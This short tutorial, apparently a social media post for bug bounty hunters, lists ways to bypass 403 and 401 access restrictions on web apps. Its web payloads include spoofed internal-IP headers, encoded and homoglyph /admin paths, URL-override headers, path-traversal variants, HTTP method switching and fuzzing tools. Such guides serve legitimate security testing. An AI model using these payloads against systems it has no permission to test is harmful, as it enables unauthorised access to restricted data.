🛡 Bypass 403 & 401 HTTP Status Codes:
A Practical Guide for Hackers & Bug Bounty Hunters
403 Forbidden or 401 Unauthorized doesn’t always mean you're blocked permanently. With a bit of creativity and the right techniques, you can bypass restricted endpoints and access sensitive areas of a web app.

Here’s a deep dive into the top methods:

🔓 1. Header Injection Tricks
Many web applications restrict access based on IP addresses. You can spoof these headers to make it look like your request is coming from an internal or whitelisted IP:
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1

👉 These headers are often trusted by reverse proxies or poorly configured servers.

🌐 2. Unicode/Encoding Tricks
Sometimes filters block specific paths like /admin, but bypass is possible with obfuscated or encoded strings:
/adm%69n (URL-encoded 'i')
/admi%6E/
/admīn/ (using Unicode characters)

🧠 Try mixing encodings or using UTF-8 homoglyphs to evade naive filters.

🪄 3. URL Override with Custom Headers
If the app is behind a proxy (like Apache, NGINX), some headers might let you rewrite the path:
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin

✅ Sometimes reverse proxies honor these headers and forward the modified path.

💣 4. Smart Payloads
Bypass 403 with URL tricks:
/admin/
/./admin/
/..;/admin/
/admin/.
/%2e/admin
/accessible/../admin

🔍 These payloads rely on path traversal, URL normalization, or unexpected token parsing by the server.

🔁 5. HTTP Method Toggling
If GET is blocked, try:
POST /admin
OPTIONS /admin
HEAD /admin

📌 Some endpoints allow different behavior based on the HTTP method. Always test all verbs.

🌐 6. Use IP or VHost Directly
Apps may have different behavior based on the host header or internal IP:
http://127.0.0.1/admin
Host: internal.target.com

🧠 Useful in SSRF or when attacking services via VPN/intranet/internal redirections.

🔍 7. Fuzzing & Bruteforce
When all else fails, fuzz it:
✅Tools like ffuf, dirsearch, feroxbuster, or gobuster
✅Try common bypass payloads, path variants, file extensions
✅ Combine with wordlists like SecLists, PayloadAllTheThings, or custom bypass lists.

🧠 Knowledge = Power. Combine these tricks to chain attacks or bypass WAFs & ACLs.
